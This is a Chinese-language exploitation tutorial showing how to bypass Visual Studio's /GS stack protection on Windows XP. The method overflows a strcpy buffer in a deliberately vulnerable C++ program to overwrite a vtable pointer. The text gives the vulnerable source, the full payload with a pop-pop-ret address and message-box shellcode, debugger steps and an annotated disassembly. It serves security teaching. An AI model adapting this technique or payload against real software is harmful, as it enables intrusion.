作者:黑蛋

## 1.简介

针对缓冲区溢出覆盖函数返回地址这一特征，微软在编译程序时使用了一个安全编译选项\--GS，Visual Studio 2003 (VS
7.0)及以后版本的Visual Studio
中默认启用了这个编译选项。在所有函数调用时，会向栈中压入一个DWORD，他是data段第一个DWORD与EBP亦或之后形成的值，处于EBP+4的位置，在所有函数执行完返回时，会有一个检查函数，检测EBP+4的值是否和原来一样，一样则正常返回，反之进入异常处理流程，函数不会正常返回，这个操作叫Security
check，如果有缓冲区溢出函数返回值，势必会淹没Security
Cookie，进入异常处理流程。如果我们在有GS保护的程序中使用栈溢出淹没返回地址EBP+4的位置，势必会破坏EBP-4的值，在函数返回之前经过Security
check，会直接导致我们栈溢出淹没返回值失败，本篇通过调用c++虚函数在GS检查函数之前的特征，通过淹没虚函数地址，让虚函数地址指向我们的shellcode，达到绕过GS保护成功溢出的目的。详细了解GS保护机制可以参考《0day安全》这本书。

## 2.环境配置

环境

|

配置  
  
---|---  
  
操作系统

|

XP系统  
  
编译器

|

vs2008  
  
调试器

|

x32dbg  
  
## 3.代码

#include "stdafx.h"  
#include "string.h"  
class GSVirtual {  
public :  
void gsv(char * src)  
{  
char buf[200];  
strcpy(buf, src);  
bar();  
}  
virtual void bar()  
{  
}  
};  
int main()  
{  
  
GSVirtual test;  
test.gsv("\x90\x90\x90\x90\x90\x90\x90\x90"  
"\x90\x90\x90\x90\x90\x90\x90\x90"  
"\x90\x90\x90\x90\x90\x90\x90\x90"  
"\x90\x90\x90\x90\x90\x90\x90\x90"  
"\x90\x90\x90\x90\x90\x90\x90\x90"  
"\x90\x90\x90\x90\x90\x90\x90\x90"  
"\x90\x90\x90\x90\x90\x90\x90\x90"  
"\x90\x90\x90\x90\x90\x90\x90\x90"  
"\x90\x90\x90\x90\x90\x90\x90\x90"  
"\x90\x90\x90\x90\x90\x90\x90\x90"  
"\x90\x90\x90\x90\x90\x90\x90\x90"  
"\x90\x90\x90\x90\x90\x90\x90\x90"  
"\x90\x90\x90\x90\x90\x90\x90\x90"  
"\x90\x90\x90\x90\x90\x90\x90\x90"  
"\x90\x90\x90\x90\x90\x90\x90\x90"  
"\x90\x90\x90\x90\x90\x90\x90\x90"  
"\x90\x90\x90\x90\x90\x90\x90\x90"  
"\x90\x90\x90\x90\x90\x90\x90\x90"  
"\x90\x90\x90\x90\x90\x90\x90\x90"  
"\x90\x90\x90\x90\x90\x90\x90\x90"  
"\x90\x90\x90\x90\x90\x90\x90\x90"  
"\x90\x90\x90\x90\x90\x90\x90\x90"  
"\x90\x90\x90\x90\x90\x90\x90\x90"  
"\x90\x90\x90\x90\x90\x90\x90\x00");  
  
return 0;  
}

这里我们首先给gsv函数传入一段正常的字符串0x90，便于我们第一次分析函数栈内情况。

## 4.项目配置如下（Win32,release）

第一步:打开项目属性\-->配置属性\-->C/C++-->代码生成\-->运行时库\-->多线程调试(/MTd);  
第二步:打开项目属性\-->配置属性\-->C/C++-->代码生成\-->缓冲区安全检查（GS）\-->是；第三步:打开项目属性\-->配置属性\-->链接器\-->高级\-->数据执行保护（DEP）\-->否；

## 5.代码介绍：

创建一个类对象，调用gsv函数，第一次传入199字节\x90,以\x00结尾，方便观察栈内情况；在gsv中有一个拷贝函数，下面紧接着调用一个虚函数；生成exe,拖入x32dbg，因为有符号文件，ctrl+g，输入main，定位到主函数（OD不行），下断点：

![](https://image.3001.net/images/20220825/1661424536_630753984ac519f6b2d26.png!small)

  
F9运行到断点处：

![](https://image.3001.net/images/20220825/1661424537_6307539933a8bc2b990d6.png!small)

第一个call是创建类对象，第二个call是gsv函数，也就是我们重点观察目标，跟进第二个call，查看堆栈，转到EBP：

![](https://image.3001.net/images/20220825/1661424538_6307539a1ec77e1f7ce0f.png!small)

  
其中EBP+4是返回地址，EBP+8是我们传入200字节字符串地址，EBP+C是虚表地址，栈中0012FE8C指向buf，即EBP-D0

![](https://image.3001.net/images/20220825/1661424538_6307539add330c95d071e.png!small)

  
我们发现第二个call是GS安全检查函数，而第一个call，经过分析是调用虚函数，如果我们通过淹没虚函数地址，控制程序流程，就可以在GS检查前达到我们的目的，绕过GS保护。

![](https://image.3001.net/images/20220825/1661424539_6307539be12693d87ef94.png!small)

  
划红线区域就是找虚表第一个虚函数的过程，发现是EBP+C地址指向的地址指向的地址是call
eax中eax的值（这块需要仔细理解），所以我们需要控制EBP+C这个位置，查看堆栈情况

![](https://image.3001.net/images/20220825/1661424540_6307539cc54d24e27a8fe.png!small)

  
我们发现需要延长字符串32个字节，才可以淹没虚表地址，所以构造新的字符串：

test.gsv(  
"\xE0\x14\x92\x7C"//这是特意构造的四字节，稍后解释  
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"  
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"/*这堆0x90是为了凑数，毫无意义，对应硬编码是nop，即滑板指令*/  
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"  
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"  
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"  
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"  
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"  
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"  
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"  
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"  
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"  
"\x53\x68\x6F\x70\x20\x20\x68\x76\x75\x6C\x74\x8B\xC4\x53\x50\x50"  
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8“/*这段是我们一个弹窗shellcode，效果是弹出一个框，如果程序弹框，证明我们栈溢出成功，并成功绕过GS保护*/  
”\x90\x90\x90\x90\x90\x90\x90\x90"  
"\x90\x90\x90\x90\x90\x90\x90\x90“/*这段同样是凑数字节，没有意义*/  
”\x8C\xFE\x12\x00"/*覆盖虚表地址的四字节，同样是我们这段字符串在栈中的首地址*/  
);

![](https://image.3001.net/images/20220825/1661424541_6307539d85fd9ae669132.png!small)

在这里，EBP+C指向的地址已经是我们buf的起始位置，当程序调用虚函数的时候，即call eax：

![](https://image.3001.net/images/20220825/1661424542_6307539e5705155404eb6.png!small)

  
这里eax的值就是虚表地址，而我们通过淹没这个地址，现在eax指向我们shellcode的第一个四字节，所以这里我们shellcode第一个四字节应该是一个地址，然后程序流程会去执行我们shellcode第一个四字节指向的地方，我们在这里构造一个pop，pop，ret，通过俩次弹栈，让ESP指向我们shellcode第5个字节之后，（第一次是call
eax，esp会压入返回值，第二个pop是我们shellcode的第一个四字节），之后ret会执行到esp指向的地方，即我们的弹窗shellcode的地方，达到目的。

![](https://image.3001.net/images/20220825/1661424543_6307539f29b53e0f3dd78.png!small)

  
下面是我shellcode第一个四字节指向的地方：

![](https://image.3001.net/images/20220825/1661424543_6307539fe50c310e490dd.png!small)

## 6.思考

(1)我们淹没的地址并不是虚函数地址，而是虚表地址，所以我们所淹没的值同样应该是一个地址，这个地址再指向一段程序；  
(2)既然我们需要shellcode前四个字节指向一段程序，为什么不直接指向下面的弹窗shellcode的位置，这是因为拷贝函数判断拷贝结束是看这个字节是否=\x00，而我们栈中的地址都是\x00开头，这样会导致拷贝终止，所以我们shellcode除了最后一个字节可以为\x00,其他地方均不得出现\x00，故而我们在程序中寻找不会出现\x00的地址，指向pop，pop，ret，达到控制程序流程到我们的shellcode的目的。

## 7.最后是我分析gsv函数的一个简单的分析注释：

地址

|

硬编码

|

汇编代码

|

注释  
  
---|---|---|---  
  
00401000

|

55

|

push ebp

|

gs_virtual.cpp:7  
  
00401001

|

8BEC

|

mov ebp,esp

|  
  
00401003

|

81EC E4000000

|

sub esp,E4

|  
  
00401009

|

A1 20304200

|

mov eax,dword ptr ds:[<___security_cook

|

00423020 DATA段第一个四字节传到EAX  
  
0040100E

|

33C5

|

xor eax,ebp

|

与EBP亦或成COOK  
  
00401010

|

8945 FC

|

mov dword ptr ss:[ebp-4],eax

|

ebp-4=GS COOK  
  
00401013

|

898D 2CFFFFFF

|

mov dword ptr ss:[ebp-D4],ecx

|

EBP-D4=虚函数地址  
  
00401019

|

8B45 08

|

mov eax,dword ptr ss:[ebp+8]

|

EAX=字符串  
  
0040101C

|

8985 28FFFFFF

|

mov dword ptr ss:[ebp-D8],eax

|

EDP-D8 = 字符串地址  
  
00401022

|

8D8D 30FFFFFF

|

lea ecx,dword ptr ss:[ebp-D0]

|

返回到ntdll  
  
00401028

|

898D 24FFFFFF

|

mov dword ptr ss:[ebp-DC],ecx

|

EBP-DC = 0012FE8C  
  
0040102E

|

8B95 24FFFFFF

|

mov edx,dword ptr ss:[ebp-DC]

|  
  
00401034

|

8995 20FFFFFF

|

mov dword ptr ss:[ebp-E0],edx

|

EBP-E0=0012FE8C  
  
0040103A

|

8B85 28FFFFFF

|

mov eax,dword ptr ss:[ebp-D8]

|  
  
00401040

|

8A08

|

mov cl,byte ptr ds:[eax]

|

CL=第一个字符  
  
00401042

|

888D 1FFFFFFF

|

mov byte ptr ss:[ebp-E1],cl

|

EBP-E1 = CL  
  
00401048

|

8B95 24FFFFFF

|

mov edx,dword ptr ss:[ebp-DC]

|

EDX = 0012FE8C  
  
0040104E

|

8A85 1FFFFFFF

|

mov al,byte ptr ss:[ebp-E1]

|  
  
00401054

|

8802

|

mov byte ptr ds:[edx],al

|

第一个字节复制到0012FE8C  
  
00401056

|

8B8D 28FFFFFF

|

mov ecx,dword ptr ss:[ebp-D8]

|

ECX=字符串地址  
  
0040105C

|

83C1 01

|

add ecx,1

|  
  
0040105F

|

898D 28FFFFFF

|

mov dword ptr ss:[ebp-D8],ecx

|

EBP-D8=字符串数组+1  
  
00401065

|

8B95 24FFFFFF

|

mov edx,dword ptr ss:[ebp-DC]

|

EDX = 0012FE8C  
  
0040106B

|

83C2 01

|

add edx,1

|  
  
0040106E

|

8995 24FFFFFF

|

mov dword ptr ss:[ebp-DC],edx

|

栈内存放字符串地址数组+1  
  
00401074

|

80BD 1FFFFFFF 00

|

cmp byte ptr ss:[ebp-E1],0

|  
  
0040107B

|

75 BD

|

jne gs_virtual.40103A

|  
  
0040107D

|

8B85 2CFFFFFF

|

mov eax,dword ptr ss:[ebp-D4]

|  
  
00401083

|

8B10

|

mov edx,dword ptr ds:[eax]

|  
  
00401085

|

8B8D 2CFFFFFF

|

mov ecx,dword ptr ss:[ebp-D4]

|  
  
0040108B

|

8B02

|

mov eax,dword ptr ds:[edx]

|  
  
0040108D

|

FFD0

|

call eax

|

取虚函数地址CALL  
  
0040108F

|

8B4D FC

|

mov ecx,dword ptr ss:[ebp-4]

|

gs_virtual.cpp:11  
  
00401092

|

33CD

|

xor ecx,ebp

|  
  
00401094

|

E8 57000000

|

call<gs_virtual.@__security_check_cook<
p=""></gs_virtual.@__security_check_cook<>

|

GS安全检查函数  
  
00401099

|

8BE5

|

mov esp,ebp

|  
  
0040109B

|

5D

|

pop ebp

|  
  
0040109C

|

C2 0400

|

ret 4

|  
  
  

